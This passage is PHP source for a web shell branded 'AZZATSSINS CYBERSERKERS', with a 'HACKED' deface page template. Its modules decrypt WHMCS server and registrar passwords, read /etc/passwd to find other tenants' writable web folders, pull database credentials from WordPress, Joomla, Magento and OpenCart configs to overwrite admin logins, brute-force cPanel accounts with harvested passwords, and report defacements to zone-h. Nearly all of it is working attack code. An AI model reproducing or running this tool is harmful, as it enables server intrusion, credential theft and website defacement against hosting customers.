		<textarea name='script' style='width: 450px; height: 200px;'><title>AZZATSSINS CYBERSERKERS WAS HERE</title></head><body bgcolor=silver><center><img src=https://lh3.googleusercontent.com/-9WF69t7d6yc/V5R43IzHHcI/AAAAAAAAATM/I-0xSRh-Vnkh6yiE5xUA-f-Mcp-RMja4QCL0B/w480-h480/azzatssins%2Bcyberserkers.png><br><br><br><br><br><b><font size=50><font color=white>[ </font><font color=red>!</font><font color=white> ]</font><font color=green><i> HACKED </i></font><font color=white>[ </font><font color=red>!</font><font color=white> ]</font></font></b><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><font color=#bababa><b><i>HACKED - CRACKED - STAMPED - FUCKED BY AZZATSSINS CYBERSERKERS</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
} elseif($_GET['do'] == 'whmcs') {
echo'<form action="?dir=$dir&do=whmcs" method="post">
';
function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "
<br>

<FORM method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS DECODER</th></tr> 
<tr><td>db_host </td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#FF0000;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#FF0000;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);



    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
	

} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";

} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='42247551N5' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='42247551N5' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
<br>
		";
	}
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>Succes Crack ".$i." Cpanel";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
<br></center>";
	}
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='AZZATSSINS'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/azx.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'chmod_dir') {
echo "<form method=post><input type='text' name='jmbt' value='".$dir."'> >> <input type='text' name='kntl' value='0755'><input type='submit' value='Chmod' name='azztssns'></form><br>";
if($_POST['azztssns']) {
$jmbt = $_POST['jmbt'];
$kntl = $_POST['kntl'];
exe("chmod ".$kntl." ".$jmbt);
echo "<font color=lime>Chmod to ".$kntl." Successfully</font><br>";

}
} elseif($_GET['act'] == 'delete_dir') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			rmdir($dir);
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>could not remove ".basename($dir)."</font>";
		}
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=chmod&dir=$dir&file=".$_GET['file']."'>chmod</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<fieldset><pre>".htmlspecialchars(@file_get_contents($_GET['file']))."</pre></fieldset>";
}
elseif($_GET['act'] == 'chmod') {
echo "<form method=post><input type='text' name='jmbt' value='".$_GET['file']."'> >> <input type='text' name='kntl' value='0755'><input type='submit' value='Chmod' name='azztssns'></form><br>";
if($_POST['azztssns']) {
$jmbt = $_POST['jmbt'];
$kntl = $_POST['kntl'];
exe("chmod ".$kntl." ".$jmbt);
echo "<font color=lime>Chmod to ".$kntl." Successfully</font><br>";

}
}
 elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=chmod&dir=$dir&file=".$_GET['file']."'>chmod</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a> | <a href='?act=chmod_dir&dir=$dir/$dirx'>chmod</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
